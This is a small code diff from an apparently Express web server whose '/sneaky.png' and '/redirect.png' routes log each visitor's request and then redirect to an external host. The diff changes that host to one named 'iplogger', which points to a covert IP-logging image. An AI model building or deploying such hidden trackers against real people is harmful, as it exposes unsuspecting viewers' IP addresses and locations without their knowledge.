@@ -34,7 +34,7 @@ app.get('/sneaky.png', (req, res) => {
 app.get('/redirect.png', (req, res) => {
     logRequest(req, 'REDIRECT-STAGE1');
     // Replace with your real file or hosted image
-    res.redirect('https://turn-alternate-lucia-acrylic.trycloudflare.com/redirect.png');
+    res.redirect('https://iplogger-cczk.onrender.com/redirect.png');
 });
 
 // For testing the final redirect target (optional)
